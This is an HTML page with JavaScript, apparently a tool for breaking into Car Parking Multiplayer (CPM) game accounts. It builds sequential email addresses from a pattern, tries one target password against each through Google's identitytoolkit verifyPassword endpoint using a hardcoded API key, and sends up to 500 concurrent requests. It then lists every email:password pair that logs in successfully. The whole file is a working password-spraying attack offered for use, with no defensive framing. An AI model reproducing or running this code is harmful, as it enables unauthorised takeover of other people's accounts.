<!DOCTYPE html>
<html>
<head>
    <title>CPM God Mode Recovery</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { background: #000; color: #ff0000; font-family: 'Courier New', monospace; text-align: center; padding: 10px; }
        .box { max-width: 500px; margin: auto; border: 3px solid #ff0000; padding: 20px; box-shadow: 0 0 30px #ff0000; border-radius: 20px; }
        h1 { font-size: 24px; text-shadow: 0 0 15px #ff0000; margin-bottom: 20px; }
        
        input { width: 100%; padding: 15px; margin: 10px 0; background: #111; border: 1px solid #ff0000; color: #fff; font-size: 16px; border-radius: 5px; box-sizing: border-box; }
        
        .btn-ignite { width: 100%; padding: 20px; background: #ff0000; color: #fff; border: none; font-weight: bold; font-size: 20px; cursor: pointer; border-radius: 10px; box-shadow: 0 0 20px #ff0000; }
        
        .stats { display: flex; justify-content: space-around; margin: 20px 0; background: #111; padding: 15px; border-radius: 10px; border: 1px solid #333; }
        .stats b { font-size: 22px; color: #fff; }

        #res { width: 100%; height: 250px; background: #000; color: #00ff00; border: 1px solid #00ff00; margin-top: 15px; padding: 10px; font-size: 14px; box-sizing: border-box; }
    </style>
</head>
<body>

<div class="box">
    <h1>🔥 GOD MODE SCAN</h1>
    
    <input type="text" id="fmt" placeholder="Format: cpm_{4}_@gmail.com">
    <input type="text" id="pwd" placeholder="Target Password">
    
    <button class="btn-ignite" id="go" onclick="godScan()">⚡ ACTIVATE GOD SPEED</button>

    <div class="stats">
        <div>CHECKED<br><b id="c">0</b></div>
        <div>FOUND<br><b id="f" style="color: #00ff00;">0</b></div>
    </div>

    <textarea id="res" readonly placeholder="Found hits will drop here..."></textarea>
</div>

<script>
    let isRunning = false;
    let checked = 0;
    let found = 0;
    let index = 0;

    async function godScan() {
        if (isRunning) { location.reload(); return; }
        
        let fmt = document.getElementById('fmt').value;
        let pwd = document.getElementById('pwd').value;
        let key = "AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ";

        if (!fmt.includes('{') || !pwd) return alert("Missing Input!");

        isRunning = true;
        document.getElementById('go').innerText = "🛑 STOP EMERGENCY";
        
        let digits = fmt.match(/\{(\d+)\}/)[1];
        let max = Math.pow(10, digits);

        // --- GOD SPEED SETTINGS ---
        // ഒരേസമയം 500 റിക്വസ്റ്റുകൾ പമ്പ് ചെയ്യുന്നു.
        let threads = 500; 

        async function engine() {
            while (isRunning && index < max) {
                let current = index++;
                let num = current.toString().padStart(digits, '0');
                let email = fmt.replace(/\{(\d+)\}/, num);
                
                // No await here for max fire
                check(email, pwd, key);
                
                checked++;
                if (checked % 50 === 0) document.getElementById('c').innerText = checked;
                
                // വളരെ ചെറിയൊരു ഡിലേ മാത്രം (ബ്രൗസർ ക്രാഷ് ആവാതിരിക്കാൻ)
                if (checked % 100 === 0) await new Promise(r => setTimeout(r, 10));
            }
        }

        for (let i = 0; i < threads; i++) {
            engine();
        }
    }

    async function check(em, pw, k) {
        try {
            let r = await fetch(`https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=${k}`, {
                method: 'POST',
                body: JSON.stringify({ email: em, password: pw, returnSecureToken: true }),
                headers: { 'Content-Type': 'application/json' }
            });
            let d = await r.json();
            if (d && d.idToken) {
                found++;
                document.getElementById('f').innerText = found;
                document.getElementById('res').value += em + ":" + pw + "\n";
            }
        } catch (e) {}
    }
</script>

</body>
</html>
